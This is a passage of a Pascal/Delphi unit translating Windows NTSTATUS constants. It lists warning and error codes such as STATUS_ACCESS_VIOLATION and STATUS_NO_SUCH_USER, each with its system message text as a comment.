// {Inconsistent EA List}
// The extended attribute (EA) list is inconsistent.
//
STATUS_EA_LIST_INCONSISTENT      = NTSTATUS($80000014);

//
// MessageId: STATUS_INVALID_EA_FLAG
//
// MessageText:
//
// {Invalid EA Flag}
// An invalid extended attribute (EA) flag was set.
//
STATUS_INVALID_EA_FLAG           = NTSTATUS($80000015);

//
// MessageId: STATUS_VERIFY_REQUIRED
//
// MessageText:
//
// {Verifying Disk}
// The media has changed and a verify operation is in progress so no reads or writes may be performed to the device, except those used in the verify operation.
//
STATUS_VERIFY_REQUIRED           = NTSTATUS($80000016);

//
// MessageId: STATUS_EXTRANEOUS_INFORMATION
//
// MessageText:
//
// {Too Much Information}
// The specified access control list (AC); contained more information than was expected.
//
STATUS_EXTRANEOUS_INFORMATION    = NTSTATUS($80000017);

//
// MessageId: STATUS_RXACT_COMMIT_NECESSARY
//
// MessageText:
//
// This warning level status indicates that the transaction state already exists for the registry sub-tree, but that a transaction commit was previously aborted.
// The commit has NOT been completed, but has not been rolled back either (so it may still be committed if desired).
//
STATUS_RXACT_COMMIT_NECESSARY    = NTSTATUS($80000018);

//
// MessageId: STATUS_NO_MORE_ENTRIES
//
// MessageText:
//
// {No More Entries}
// No more entries are available from an enumeration operation.
//
STATUS_NO_MORE_ENTRIES           = NTSTATUS($8000001A);

//
// MessageId: STATUS_FILEMARK_DETECTED
//
// MessageText:
//
// {Filemark Found}
// A filemark was detected.
//
STATUS_FILEMARK_DETECTED         = NTSTATUS($8000001B);

//
// MessageId: STATUS_MEDIA_CHANGED
//
// MessageText:
//
// {Media Changed}
// The media may have changed.
//
STATUS_MEDIA_CHANGED             = NTSTATUS($8000001C);

//
// MessageId: STATUS_BUS_RESET
//
// MessageText:
//
// {I/O Bus Reset}
// An I/O bus reset was detected.
//
STATUS_BUS_RESET                 = NTSTATUS($8000001D);

//
// MessageId: STATUS_END_OF_MEDIA
//
// MessageText:
//
// {End of Media}
// The end of the media was encountered.
//
STATUS_END_OF_MEDIA              = NTSTATUS($8000001E);

//
// MessageId: STATUS_BEGINNING_OF_MEDIA
//
// MessageText:
//
// Beginning of tape or partition has been detected.
//
STATUS_BEGINNING_OF_MEDIA        = NTSTATUS($8000001F);

//
// MessageId: STATUS_MEDIA_CHECK
//
// MessageText:
//
// {Media Changed}
// The media may have changed.
//
STATUS_MEDIA_CHECK               = NTSTATUS($80000020);

//
// MessageId: STATUS_SETMARK_DETECTED
//
// MessageText:
//
// A tape access reached a setmark.
//
STATUS_SETMARK_DETECTED          = NTSTATUS($80000021);

//
// MessageId: STATUS_NO_DATA_DETECTED
//
// MessageText:
//
// During a tape access, the end of the data written is reached.
//
STATUS_NO_DATA_DETECTED          = NTSTATUS($80000022);

//
// MessageId: STATUS_REDIRECTOR_HAS_OPEN_HANDLES
//
// MessageText:
//
// The redirector is in use and cannot be unloaded.
//
STATUS_REDIRECTOR_HAS_OPEN_HANDLES = NTSTATUS($80000023);

//
// MessageId: STATUS_SERVER_HAS_OPEN_HANDLES
//
// MessageText:
//
// The server is in use and cannot be unloaded.
//
STATUS_SERVER_HAS_OPEN_HANDLES   = NTSTATUS($80000024);

//
// MessageId: STATUS_ALREADY_DISCONNECTED
//
// MessageText:
//
// The specified connection has already been disconnected.
//
STATUS_ALREADY_DISCONNECTED      = NTSTATUS($80000025);

//
// MessageId: STATUS_LONGJUMP
//
// MessageText:
//
// A long jump has been executed.
//
STATUS_LONGJUMP                  = NTSTATUS($80000026);    // winnt

//
// MessageId: STATUS_CLEANER_CARTRIDGE_INSTALLED
//
// MessageText:
//
// A cleaner cartridge is present in the tape library.
//
STATUS_CLEANER_CARTRIDGE_INSTALLED = NTSTATUS($80000027);

//
// MessageId: STATUS_PLUGPLAY_QUERY_VETOED
//
// MessageText:
//
// The Plug and Play query operation was not successful.
//
STATUS_PLUGPLAY_QUERY_VETOED     = NTSTATUS($80000028);

//
// MessageId: STATUS_UNWIND_CONSOLIDATE
//
// MessageText:
//
// A frame consolidation has been executed.
//
STATUS_UNWIND_CONSOLIDATE        = NTSTATUS($80000029);    // winnt

//
// MessageId: STATUS_REGISTRY_HIVE_RECOVERED
//
// MessageText:
//
// {Registry Hive Recovered}
// Registry hive (file):
// %hs
// was corrupted and it has been recovered. Some data might have been lost.
//
STATUS_REGISTRY_HIVE_RECOVERED   = NTSTATUS($8000002A);

//
// MessageId: STATUS_DLL_MIGHT_BE_INSECURE
//
// MessageText:
//
// The application is attempting to run executable code from the module %hs. This may be insecure. An alternative, %hs, is available. Should the application use the secure module %hs?
//
STATUS_DLL_MIGHT_BE_INSECURE     = NTSTATUS($8000002B);

//
// MessageId: STATUS_DLL_MIGHT_BE_INCOMPATIBLE
//
// MessageText:
//
// The application is loading executable code from the module %hs. This is secure, but may be incompatible with previous releases of the operating system. An alternative, %hs, is available. Should the application use the secure module %hs?
//
STATUS_DLL_MIGHT_BE_INCOMPATIBLE = NTSTATUS($8000002C);

//
// MessageId: STATUS_STOPPED_ON_SYMLINK
//
// MessageText:
//
// The create operation stopped after reaching a symbolic link.
//
STATUS_STOPPED_ON_SYMLINK        = NTSTATUS($8000002D);

//
// MessageId: STATUS_CANNOT_GRANT_REQUESTED_OPLOCK
//
// MessageText:
//
// An oplock of the requested level cannot be granted.  An oplock of a lower level may be available.
//
STATUS_CANNOT_GRANT_REQUESTED_OPLOCK = NTSTATUS($8000002E);

//
// MessageId: STATUS_NO_ACE_CONDITION
//
// MessageText:
//
// {No ACE Condition}
// The specified access control entry (ACE) does not contain a condition.
//
STATUS_NO_ACE_CONDITION          = NTSTATUS($8000002F);

//
// MessageId: STATUS_DEVICE_SUPPORT_IN_PROGRESS
//
// MessageText:
//
// {Support Being Determined}
// Device's command support detection is in progress.
//
STATUS_DEVICE_SUPPORT_IN_PROGRESS = NTSTATUS($80000030);

//
// MessageId: STATUS_DEVICE_POWER_CYCLE_REQUIRED
//
// MessageText:
//
// The device needs to be power cycled.
//
STATUS_DEVICE_POWER_CYCLE_REQUIRED = NTSTATUS($80000031);

//
// MessageId: STATUS_NO_WORK_DONE
//
// MessageText:
//
// The action requested resulted in no work being done. Error-style clean-up has been performed.
//
STATUS_NO_WORK_DONE              = NTSTATUS($80000032);

//
// MessageId: STATUS_RETURN_ADDRESS_HIJACK_ATTEMPT
//
// MessageText:
//
// A return address hijack is being attempted. This is supported by the operating system when user-mode shadow stacks are enabled.
//
STATUS_RETURN_ADDRESS_HIJACK_ATTEMPT = NTSTATUS($80000033);

//
// MessageId: DBG_EXCEPTION_NOT_HANDLED
//
// MessageText:
//
// Debugger did not handle the exception.
//
DBG_EXCEPTION_NOT_HANDLED        = NTSTATUS($80010001);    // winnt

//
// MessageId: STATUS_CLUSTER_NODE_ALREADY_UP
//
// MessageText:
//
// The cluster node is already up.
//
STATUS_CLUSTER_NODE_ALREADY_UP   = NTSTATUS($80130001);

//
// MessageId: STATUS_CLUSTER_NODE_ALREADY_DOWN
//
// MessageText:
//
// The cluster node is already down.
//
STATUS_CLUSTER_NODE_ALREADY_DOWN = NTSTATUS($80130002);

//
// MessageId: STATUS_CLUSTER_NETWORK_ALREADY_ONLINE
//
// MessageText:
//
// The cluster network is already online.
//
STATUS_CLUSTER_NETWORK_ALREADY_ONLINE = NTSTATUS($80130003);

//
// MessageId: STATUS_CLUSTER_NETWORK_ALREADY_OFFLINE
//
// MessageText:
//
// The cluster network is already offline.
//
STATUS_CLUSTER_NETWORK_ALREADY_OFFLINE = NTSTATUS($80130004);

//
// MessageId: STATUS_CLUSTER_NODE_ALREADY_MEMBER
//
// MessageText:
//
// The cluster node is already a member of the cluster.
//
STATUS_CLUSTER_NODE_ALREADY_MEMBER = NTSTATUS($80130005);

//
// MessageId: STATUS_FLT_BUFFER_TOO_SMALL
//
// MessageText:
//
// {Buffer too small}
// The buffer is too small to contain the entry. No information has been written to the buffer.
//
STATUS_FLT_BUFFER_TOO_SMALL      = NTSTATUS($801C0001);

//
// MessageId: STATUS_FVE_PARTIAL_METADATA
//
// MessageText:
//
// Volume Metadata read or write is incomplete.
//
STATUS_FVE_PARTIAL_METADATA      = NTSTATUS($80210001);

//
// MessageId: STATUS_FVE_TRANSIENT_STATE
//
// MessageText:
//
// BitLocker encryption keys were ignored because the volume was in a transient state.
//
STATUS_FVE_TRANSIENT_STATE       = NTSTATUS($80210002);

{*++

 MessageId's 0xcf00 - 0xcfff (inclusive) are for Cloud Files specific warning messages.

--*}
//
// MessageId: STATUS_CLOUD_FILE_PROPERTY_BLOB_CHECKSUM_MISMATCH
//
// MessageText:
//
// The cloud file property is possibly corrupt. The on-disk checksum does not match the computed checksum.
//
STATUS_CLOUD_FILE_PROPERTY_BLOB_CHECKSUM_MISMATCH = NTSTATUS($8000CF00);

{*++

 End of Cloud Files specific warning messages.

--*}
/////////////////////////////////////////////////////////////////////////
//
//  Standard Error values
//
/////////////////////////////////////////////////////////////////////////

//
// MessageId: STATUS_UNSUCCESSFUL
//
// MessageText:
//
// {Operation Failed}
// The requested operation was unsuccessful.
//
STATUS_UNSUCCESSFUL              = NTSTATUS($C0000001);

//
// MessageId: STATUS_NOT_IMPLEMENTED
//
// MessageText:
//
// {Not Implemented}
// The requested operation is not implemented.
//
STATUS_NOT_IMPLEMENTED           = NTSTATUS($C0000002);

//
// MessageId: STATUS_INVALID_INFO_CLASS
//
// MessageText:
//
// {Invalid Parameter}
// The specified information class is not a valid information class for the specified object.
//
STATUS_INVALID_INFO_CLASS        = NTSTATUS($C0000003);    // ntsubauth

//
// MessageId: STATUS_INFO_LENGTH_MISMATCH
//
// MessageText:
//
// The specified information record length does not match the length required for the specified information class.
//
STATUS_INFO_LENGTH_MISMATCH      = NTSTATUS($C0000004);

//
// MessageId: STATUS_ACCESS_VIOLATION
//
// MessageText:
//
// The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
//
STATUS_ACCESS_VIOLATION          = NTSTATUS($C0000005);    // winnt

//
// MessageId: STATUS_IN_PAGE_ERROR
//
// MessageText:
//
// The instruction at 0x%p referenced memory at 0x%p. The required data was not placed into memory because of an I/O error status of 0x%x.
//
STATUS_IN_PAGE_ERROR             = NTSTATUS($C0000006);    // winnt

//
// MessageId: STATUS_PAGEFILE_QUOTA
//
// MessageText:
//
// The pagefile quota for the process has been exhausted.
//
STATUS_PAGEFILE_QUOTA            = NTSTATUS($C0000007);

//
// MessageId: STATUS_INVALID_HANDLE
//
// MessageText:
//
// An invalid HANDLE was specified.
//
STATUS_INVALID_HANDLE            = NTSTATUS($C0000008);    // winnt

//
// MessageId: STATUS_BAD_INITIAL_STACK
//
// MessageText:
//
// An invalid initial stack was specified in a call to NtCreateThread.
//
STATUS_BAD_INITIAL_STACK         = NTSTATUS($C0000009);

//
// MessageId: STATUS_BAD_INITIAL_PC
//
// MessageText:
//
// An invalid initial start address was specified in a call to NtCreateThread.
//
STATUS_BAD_INITIAL_PC            = NTSTATUS($C000000A);

//
// MessageId: STATUS_INVALID_CID
//
// MessageText:
//
// An invalid Client ID was specified.
//
STATUS_INVALID_CID               = NTSTATUS($C000000B);

//
// MessageId: STATUS_TIMER_NOT_CANCELED
//
// MessageText:
//
// An attempt was made to cancel or set a timer that has an associated APC and the subject thread is not the thread that originally set the timer with an associated APC routine.
//
STATUS_TIMER_NOT_CANCELED        = NTSTATUS($C000000C);

//
// MessageId: STATUS_INVALID_PARAMETER
//
// MessageText:
//
// An invalid parameter was passed to a service or function.
//
STATUS_INVALID_PARAMETER         = NTSTATUS($C000000D);    // winnt

//
// MessageId: STATUS_NO_SUCH_DEVICE
//
// MessageText:
//
// A device which does not exist was specified.
//
STATUS_NO_SUCH_DEVICE            = NTSTATUS($C000000E);

//
// MessageId: STATUS_NO_SUCH_FILE
//
// MessageText:
//
// {File Not Found}
// The file %hs does not exist.
//
STATUS_NO_SUCH_FILE              = NTSTATUS($C000000F);

//
// MessageId: STATUS_INVALID_DEVICE_REQUEST
//
// MessageText:
//
// The specified request is not a valid operation for the target device.
//
STATUS_INVALID_DEVICE_REQUEST    = NTSTATUS($C0000010);

//
// MessageId: STATUS_END_OF_FILE
//
// MessageText:
//
// The end-of-file marker has been reached. There is no valid data in the file beyond this marker.
//
STATUS_END_OF_FILE               = NTSTATUS($C0000011);

//
// MessageId: STATUS_WRONG_VOLUME
//
// MessageText:
//
// {Wrong Volume}
// The wrong volume is in the drive.
// Please insert volume %hs into drive %hs.
//
STATUS_WRONG_VOLUME              = NTSTATUS($C0000012);

//
// MessageId: STATUS_NO_MEDIA_IN_DEVICE
//
// MessageText:
//
// {No Disk}
// There is no disk in the drive.
// Please insert a disk into drive %hs.
//
STATUS_NO_MEDIA_IN_DEVICE        = NTSTATUS($C0000013);

//
// MessageId: STATUS_UNRECOGNIZED_MEDIA
//
// MessageText:
//
// {Unknown Disk Format}
// The disk in drive %hs is not formatted properly.
// Please check the disk, and reformat if necessary.
//
STATUS_UNRECOGNIZED_MEDIA        = NTSTATUS($C0000014);

//
// MessageId: STATUS_NONEXISTENT_SECTOR
//
// MessageText:
//
// {Sector Not Found}
// The specified sector does not exist.
//
STATUS_NONEXISTENT_SECTOR        = NTSTATUS($C0000015);

//
// MessageId: STATUS_MORE_PROCESSING_REQUIRED
//
// MessageText:
//
// {Still Busy}
// The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.
//
STATUS_MORE_PROCESSING_REQUIRED  = NTSTATUS($C0000016);

//
// MessageId: STATUS_NO_MEMORY
//
// MessageText:
//
// {Not Enough Quota}
// Not enough virtual memory or paging file quota is available to complete the specified operation.
//
STATUS_NO_MEMORY                 = NTSTATUS($C0000017);    // winnt

//
// MessageId: STATUS_CONFLICTING_ADDRESSES
//
// MessageText:
//
// {Conflicting Address Range}
// The specified address range conflicts with the address space.
//
STATUS_CONFLICTING_ADDRESSES     = NTSTATUS($C0000018);

//
// MessageId: STATUS_NOT_MAPPED_VIEW
//
// MessageText:
//
// Address range to unmap is not a mapped view.
//
STATUS_NOT_MAPPED_VIEW           = NTSTATUS($C0000019);

//
// MessageId: STATUS_UNABLE_TO_FREE_VM
//
// MessageText:
//
// Virtual memory cannot be freed.
//
STATUS_UNABLE_TO_FREE_VM         = NTSTATUS($C000001A);

//
// MessageId: STATUS_UNABLE_TO_DELETE_SECTION
//
// MessageText:
//
// Specified section cannot be deleted.
//
STATUS_UNABLE_TO_DELETE_SECTION  = NTSTATUS($C000001B);

//
// MessageId: STATUS_INVALID_SYSTEM_SERVICE
//
// MessageText:
//
// An invalid system service was specified in a system service call.
//
STATUS_INVALID_SYSTEM_SERVICE    = NTSTATUS($C000001C);

//
// MessageId: STATUS_ILLEGAL_INSTRUCTION
//
// MessageText:
//
// {EXCEPTION}
// Illegal Instruction
// An attempt was made to execute an illegal instruction.
//
STATUS_ILLEGAL_INSTRUCTION       = NTSTATUS($C000001D);    // winnt

//
// MessageId: STATUS_INVALID_LOCK_SEQUENCE
//
// MessageText:
//
// {Invalid Lock Sequence}
// An attempt was made to execute an invalid lock sequence.
//
STATUS_INVALID_LOCK_SEQUENCE     = NTSTATUS($C000001E);

//
// MessageId: STATUS_INVALID_VIEW_SIZE
//
// MessageText:
//
// {Invalid Mapping}
// An attempt was made to create a view for a section which is bigger than the section.
//
STATUS_INVALID_VIEW_SIZE         = NTSTATUS($C000001F);

//
// MessageId: STATUS_INVALID_FILE_FOR_SECTION
//
// MessageText:
//
// {Bad File}
// The attributes of the specified mapping file for a section of memory cannot be read.
//
STATUS_INVALID_FILE_FOR_SECTION  = NTSTATUS($C0000020);

//
// MessageId: STATUS_ALREADY_COMMITTED
//
// MessageText:
//
// {Already Committed}
// The specified address range is already committed.
//
STATUS_ALREADY_COMMITTED         = NTSTATUS($C0000021);

//
// MessageId: STATUS_ACCESS_DENIED
//
// MessageText:
//
// {Access Denied}
// A process has requested access to an object, but has not been granted those access rights.
//
STATUS_ACCESS_DENIED             = NTSTATUS($C0000022);

//
// MessageId: STATUS_BUFFER_TOO_SMALL
//
// MessageText:
//
// {Buffer Too Small}
// The buffer is too small to contain the entry. No information has been written to the buffer.
//
STATUS_BUFFER_TOO_SMALL          = NTSTATUS($C0000023);

//
// MessageId: STATUS_OBJECT_TYPE_MISMATCH
//
// MessageText:
//
// {Wrong Type}
// There is a mismatch between the type of object required by the requested operation and the type of object that is specified in the request.
//
STATUS_OBJECT_TYPE_MISMATCH      = NTSTATUS($C0000024);

//
// MessageId: STATUS_NONCONTINUABLE_EXCEPTION
//
// MessageText:
//
// {EXCEPTION}
// Cannot Continue
// Windows cannot continue from this exception.
//
STATUS_NONCONTINUABLE_EXCEPTION  = NTSTATUS($C0000025);    // winnt

//
// MessageId: STATUS_INVALID_DISPOSITION
//
// MessageText:
//
// An invalid exception disposition was returned by an exception handler.
//
STATUS_INVALID_DISPOSITION       = NTSTATUS($C0000026);    // winnt

//
// MessageId: STATUS_UNWIND
//
// MessageText:
//
// Unwind exception code.
//
STATUS_UNWIND                    = NTSTATUS($C0000027);

//
// MessageId: STATUS_BAD_STACK
//
// MessageText:
//
// An invalid or unaligned stack was encountered during an unwind operation.
//
STATUS_BAD_STACK                 = NTSTATUS($C0000028);

//
// MessageId: STATUS_INVALID_UNWIND_TARGET
//
// MessageText:
//
// An invalid unwind target was encountered during an unwind operation.
//
STATUS_INVALID_UNWIND_TARGET     = NTSTATUS($C0000029);

//
// MessageId: STATUS_NOT_LOCKED
//
// MessageText:
//
// An attempt was made to unlock a page of memory which was not locked.
//
STATUS_NOT_LOCKED                = NTSTATUS($C000002A);

//
// MessageId: STATUS_PARITY_ERROR
//
// MessageText:
//
// Device parity error on I/O operation.
//
STATUS_PARITY_ERROR              = NTSTATUS($C000002B);

//
// MessageId: STATUS_UNABLE_TO_DECOMMIT_VM
//
// MessageText:
//
// An attempt was made to decommit uncommitted virtual memory.
//
STATUS_UNABLE_TO_DECOMMIT_VM     = NTSTATUS($C000002C);

//
// MessageId: STATUS_NOT_COMMITTED
//
// MessageText:
//
// An attempt was made to change the attributes on memory that has not been committed.
//
STATUS_NOT_COMMITTED             = NTSTATUS($C000002D);

//
// MessageId: STATUS_INVALID_PORT_ATTRIBUTES
//
// MessageText:
//
// Invalid Object Attributes specified to NtCreatePort or invalid Port Attributes specified to NtConnectPort
//
STATUS_INVALID_PORT_ATTRIBUTES   = NTSTATUS($C000002E);

//
// MessageId: STATUS_PORT_MESSAGE_TOO_LONG
//
// MessageText:
//
// Length of message passed to NtRequestPort or NtRequestWaitReplyPort was longer than the maximum message allowed by the port.
//
STATUS_PORT_MESSAGE_TOO_LONG     = NTSTATUS($C000002F);

//
// MessageId: STATUS_INVALID_PARAMETER_MIX
//
// MessageText:
//
// An invalid combination of parameters was specified.
//
STATUS_INVALID_PARAMETER_MIX     = NTSTATUS($C0000030);

//
// MessageId: STATUS_INVALID_QUOTA_LOWER
//
// MessageText:
//
// An attempt was made to lower a quota limit below the current usage.
//
STATUS_INVALID_QUOTA_LOWER       = NTSTATUS($C0000031);

//
// MessageId: STATUS_DISK_CORRUPT_ERROR
//
// MessageText:
//
// {Corrupt Disk}
// The file system structure on the disk is corrupt and unusable.
// Please run the Chkdsk utility on the volume %hs.
//
STATUS_DISK_CORRUPT_ERROR        = NTSTATUS($C0000032);

//
// MessageId: STATUS_OBJECT_NAME_INVALID
//
// MessageText:
//
// Object Name invalid.
//
STATUS_OBJECT_NAME_INVALID       = NTSTATUS($C0000033);

//
// MessageId: STATUS_OBJECT_NAME_NOT_FOUND
//
// MessageText:
//
// Object Name not found.
//
STATUS_OBJECT_NAME_NOT_FOUND     = NTSTATUS($C0000034);

//
// MessageId: STATUS_OBJECT_NAME_COLLISION
//
// MessageText:
//
// Object Name already exists.
//
STATUS_OBJECT_NAME_COLLISION     = NTSTATUS($C0000035);

//
// MessageId: STATUS_PORT_DO_NOT_DISTURB
//
// MessageText:
//
// A port with the 'do not disturb' flag set attempted to send a message to a port in a suspended process.
// The process was not woken, and the message was not delivered.
//
STATUS_PORT_DO_NOT_DISTURB       = NTSTATUS($C0000036);

//
// MessageId: STATUS_PORT_DISCONNECTED
//
// MessageText:
//
// Attempt to send a message to a disconnected communication port.
//
STATUS_PORT_DISCONNECTED         = NTSTATUS($C0000037);

//
// MessageId: STATUS_DEVICE_ALREADY_ATTACHED
//
// MessageText:
//
// An attempt was made to attach to a device that was already attached to another device.
//
STATUS_DEVICE_ALREADY_ATTACHED   = NTSTATUS($C0000038);

//
// MessageId: STATUS_OBJECT_PATH_INVALID
//
// MessageText:
//
// Object Path Component was not a directory object.
//
STATUS_OBJECT_PATH_INVALID       = NTSTATUS($C0000039);

//
// MessageId: STATUS_OBJECT_PATH_NOT_FOUND
//
// MessageText:
//
// {Path Not Found}
// The path %hs does not exist.
//
STATUS_OBJECT_PATH_NOT_FOUND     = NTSTATUS($C000003A);

//
// MessageId: STATUS_OBJECT_PATH_SYNTAX_BAD
//
// MessageText:
//
// Object Path Component was not a directory object.
//
STATUS_OBJECT_PATH_SYNTAX_BAD    = NTSTATUS($C000003B);

//
// MessageId: STATUS_DATA_OVERRUN
//
// MessageText:
//
// {Data Overrun}
// A data overrun error occurred.
//
STATUS_DATA_OVERRUN              = NTSTATUS($C000003C);

//
// MessageId: STATUS_DATA_LATE_ERROR
//
// MessageText:
//
// {Data Late}
// A data late error occurred.
//
STATUS_DATA_LATE_ERROR           = NTSTATUS($C000003D);

//
// MessageId: STATUS_DATA_ERROR
//
// MessageText:
//
// {Data Error}
// An error in reading or writing data occurred.
//
STATUS_DATA_ERROR                = NTSTATUS($C000003E);

//
// MessageId: STATUS_CRC_ERROR
//
// MessageText:
//
// {Bad CRC}
// A cyclic redundancy check (CRC) checksum error occurred.
//
STATUS_CRC_ERROR                 = NTSTATUS($C000003F);

//
// MessageId: STATUS_SECTION_TOO_BIG
//
// MessageText:
//
// {Section Too Large}
// The specified section is too big to map the file.
//
STATUS_SECTION_TOO_BIG           = NTSTATUS($C0000040);

//
// MessageId: STATUS_PORT_CONNECTION_REFUSED
//
// MessageText:
//
// The NtConnectPort request is refused.
//
STATUS_PORT_CONNECTION_REFUSED   = NTSTATUS($C0000041);

//
// MessageId: STATUS_INVALID_PORT_HANDLE
//
// MessageText:
//
// The type of port handle is invalid for the operation requested.
//
STATUS_INVALID_PORT_HANDLE       = NTSTATUS($C0000042);

//
// MessageId: STATUS_SHARING_VIOLATION
//
// MessageText:
//
// A file cannot be opened because the share access flags are incompatible.
//
STATUS_SHARING_VIOLATION         = NTSTATUS($C0000043);

//
// MessageId: STATUS_QUOTA_EXCEEDED
//
// MessageText:
//
// Insufficient quota exists to complete the operation
//
STATUS_QUOTA_EXCEEDED            = NTSTATUS($C0000044);

//
// MessageId: STATUS_INVALID_PAGE_PROTECTION
//
// MessageText:
//
// The specified page protection was not valid.
//
STATUS_INVALID_PAGE_PROTECTION   = NTSTATUS($C0000045);

//
// MessageId: STATUS_MUTANT_NOT_OWNED
//
// MessageText:
//
// An attempt to release a mutant object was made by a thread that was not the owner of the mutant object.
//
STATUS_MUTANT_NOT_OWNED          = NTSTATUS($C0000046);

//
// MessageId: STATUS_SEMAPHORE_LIMIT_EXCEEDED
//
// MessageText:
//
// An attempt was made to release a semaphore such that its maximum count would have been exceeded.
//
STATUS_SEMAPHORE_LIMIT_EXCEEDED  = NTSTATUS($C0000047);

//
// MessageId: STATUS_PORT_ALREADY_SET
//
// MessageText:
//
// An attempt to set a process's DebugPort or ExceptionPort was made, but a port already exists in the process or an attempt to set a file's CompletionPort made, but a port was already set in the file or an attempt to set an ALPC port's associated completion port was made, but it is already set.
//
STATUS_PORT_ALREADY_SET          = NTSTATUS($C0000048);

//
// MessageId: STATUS_SECTION_NOT_IMAGE
//
// MessageText:
//
// An attempt was made to query image information on a section which does not map an image.
//
STATUS_SECTION_NOT_IMAGE         = NTSTATUS($C0000049);

//
// MessageId: STATUS_SUSPEND_COUNT_EXCEEDED
//
// MessageText:
//
// An attempt was made to suspend a thread whose suspend count was at its maximum.
//
STATUS_SUSPEND_COUNT_EXCEEDED    = NTSTATUS($C000004A);

//
// MessageId: STATUS_THREAD_IS_TERMINATING
//
// MessageText:
//
// An attempt was made to access a thread that has begun termination.
//
STATUS_THREAD_IS_TERMINATING     = NTSTATUS($C000004B);

//
// MessageId: STATUS_BAD_WORKING_SET_LIMIT
//
// MessageText:
//
// An attempt was made to set the working set limit to an invalid value (minimum greater than maximum, etc).
//
STATUS_BAD_WORKING_SET_LIMIT     = NTSTATUS($C000004C);

//
// MessageId: STATUS_INCOMPATIBLE_FILE_MAP
//
// MessageText:
//
// A section was created to map a file which is not compatible to an already existing section which maps the same file.
//
STATUS_INCOMPATIBLE_FILE_MAP     = NTSTATUS($C000004D);

//
// MessageId: STATUS_SECTION_PROTECTION
//
// MessageText:
//
// A view to a section specifies a protection which is incompatible with the initial view's protection.
//
STATUS_SECTION_PROTECTION        = NTSTATUS($C000004E);

//
// MessageId: STATUS_EAS_NOT_SUPPORTED
//
// MessageText:
//
// An operation involving EAs failed because the file system does not support EAs.
//
STATUS_EAS_NOT_SUPPORTED         = NTSTATUS($C000004F);

//
// MessageId: STATUS_EA_TOO_LARGE
//
// MessageText:
//
// An EA operation failed because EA set is too large.
//
STATUS_EA_TOO_LARGE              = NTSTATUS($C0000050);

//
// MessageId: STATUS_NONEXISTENT_EA_ENTRY
//
// MessageText:
//
// An EA operation failed because the name or EA index is invalid.
//
STATUS_NONEXISTENT_EA_ENTRY      = NTSTATUS($C0000051);

//
// MessageId: STATUS_NO_EAS_ON_FILE
//
// MessageText:
//
// The file for which EAs were requested has no EAs.
//
STATUS_NO_EAS_ON_FILE            = NTSTATUS($C0000052);

//
// MessageId: STATUS_EA_CORRUPT_ERROR
//
// MessageText:
//
// The EA is corrupt and non-readable.
//
STATUS_EA_CORRUPT_ERROR          = NTSTATUS($C0000053);

//
// MessageId: STATUS_FILE_LOCK_CONFLICT
//
// MessageText:
//
// A requested read/write cannot be granted due to a conflicting file lock.
//
STATUS_FILE_LOCK_CONFLICT        = NTSTATUS($C0000054);

//
// MessageId: STATUS_LOCK_NOT_GRANTED
//
// MessageText:
//
// A requested file lock cannot be granted due to other existing locks.
//
STATUS_LOCK_NOT_GRANTED          = NTSTATUS($C0000055);

//
// MessageId: STATUS_DELETE_PENDING
//
// MessageText:
//
// A non close operation has been requested of a file object with a delete pending.
//
STATUS_DELETE_PENDING            = NTSTATUS($C0000056);

//
// MessageId: STATUS_CTL_FILE_NOT_SUPPORTED
//
// MessageText:
//
// An attempt was made to set the control attribute on a file. This attribute is not supported in the target file system.
//
STATUS_CTL_FILE_NOT_SUPPORTED    = NTSTATUS($C0000057);

//
// MessageId: STATUS_UNKNOWN_REVISION
//
// MessageText:
//
// Indicates a revision number encountered or specified is not one known by the service. It may be a more recent revision than the service is aware of.
//
STATUS_UNKNOWN_REVISION          = NTSTATUS($C0000058);

//
// MessageId: STATUS_REVISION_MISMATCH
//
// MessageText:
//
// Indicates two revision levels are incompatible.
//
STATUS_REVISION_MISMATCH         = NTSTATUS($C0000059);

//
// MessageId: STATUS_INVALID_OWNER
//
// MessageText:
//
// Indicates a particular Security ID may not be assigned as the owner of an object.
//
STATUS_INVALID_OWNER             = NTSTATUS($C000005A);

//
// MessageId: STATUS_INVALID_PRIMARY_GROUP
//
// MessageText:
//
// Indicates a particular Security ID may not be assigned as the primary group of an object.
//
STATUS_INVALID_PRIMARY_GROUP     = NTSTATUS($C000005B);

//
// MessageId: STATUS_NO_IMPERSONATION_TOKEN
//
// MessageText:
//
// An attempt has been made to operate on an impersonation token by a thread that is not currently impersonating a client.
//
STATUS_NO_IMPERSONATION_TOKEN    = NTSTATUS($C000005C);

//
// MessageId: STATUS_CANT_DISABLE_MANDATORY
//
// MessageText:
//
// A mandatory group may not be disabled.
//
STATUS_CANT_DISABLE_MANDATORY    = NTSTATUS($C000005D);

//
// MessageId: STATUS_NO_LOGON_SERVERS
//
// MessageText:
//
// We can't sign you in with this credential because your domain isn't available. Make sure your device is connected to your organization's network and try again. If you previously signed in on this device with another credential, you can sign in with that credential.
//
STATUS_NO_LOGON_SERVERS          = NTSTATUS($C000005E);

//
// MessageId: STATUS_NO_SUCH_LOGON_SESSION
//
// MessageText:
//
// A specified logon session does not exist. It may already have been terminated.
//
STATUS_NO_SUCH_LOGON_SESSION     = NTSTATUS($C000005F);

//
// MessageId: STATUS_NO_SUCH_PRIVILEGE
//
// MessageText:
//
// A specified privilege does not exist.
//
STATUS_NO_SUCH_PRIVILEGE         = NTSTATUS($C0000060);

//
// MessageId: STATUS_PRIVILEGE_NOT_HELD
//
// MessageText:
//
// A required privilege is not held by the client.
//
STATUS_PRIVILEGE_NOT_HELD        = NTSTATUS($C0000061);

//
// MessageId: STATUS_INVALID_ACCOUNT_NAME
//
// MessageText:
//
// The name provided is not a properly formed account name.
//
STATUS_INVALID_ACCOUNT_NAME      = NTSTATUS($C0000062);

//
// MessageId: STATUS_USER_EXISTS
//
// MessageText:
//
// The specified account already exists.
//
STATUS_USER_EXISTS               = NTSTATUS($C0000063);

//
// MessageId: STATUS_NO_SUCH_USER
//
// MessageText:
//
// The specified account does not exist.
//
STATUS_NO_SUCH_USER              = NTSTATUS($C0000064);     // ntsubauth

//
// MessageId: STATUS_GROUP_EXISTS
//
// MessageText:
//
// The specified group already exists.
//
STATUS_GROUP_EXISTS              = NTSTATUS($C0000065);

//
// MessageId: STATUS_NO_SUCH_GROUP
//
// MessageText:
//
// The specified group does not exist.
//
STATUS_NO_SUCH_GROUP             = NTSTATUS($C0000066);

//
// MessageId: STATUS_MEMBER_IN_GROUP
//
// MessageText:
//
// The specified user account is already in the specified group account. Also used to indicate a group cannot be deleted because it contains a member.
//
